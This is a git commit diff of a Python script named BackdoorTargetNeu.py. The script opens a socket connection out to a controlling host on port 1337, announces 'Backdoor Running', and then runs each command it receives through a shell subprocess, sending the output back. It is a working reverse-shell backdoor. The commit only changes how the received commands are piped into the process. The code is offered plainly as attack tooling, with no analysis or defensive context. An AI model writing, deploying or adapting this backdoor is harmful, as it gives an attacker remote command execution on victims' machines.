ecd066884e72e7a71186ffd76eb976e24fe4576b
DasCodeMonster <pl.lkw.01@gmail.com>
2017-06-25 20:24:02 +0200

    added all

--- BackdoorTargetNeu.py
+++ BackdoorTargetNeu.py
@@ -7,15 +7,17 @@ Port = 1337
 s = so.socket(so.AF_INET, so.SOCK_STREAM)
 s.connect((Host, Port))
 s.send(b"Backdoor Running")
+process = sb.Popen("echo Hallo", shell=True, stdin=sb.PIPE, stdout=sb.PIPE, stderr=sb.PIPE)
 while True:
     data = s.recv(5120)
     print(data.decode("utf-8"))
-    process = sb.Popen(data.decode("utf-8"), shell=True, stdin=sb.PIPE, stdout=sb.PIPE, stderr=sb.PIPE)
-    out = process.stdout.read()
+    out, err = process.communicate(input=data)
+    # out = process.stdout.read()
+    # err = process.stderr.read()
+    print(err.decode("cp850"))
     print(out.decode("cp850"))
     if len(out) == 0:
-        s.send("OK".encode(encoding='cp850'))
+        s.send("<Leer>".encode(encoding='cp850'))
     else:
         s.send(out)
-    print(type(process.stderr.read()))
 #     s.send(process.stderr.read())
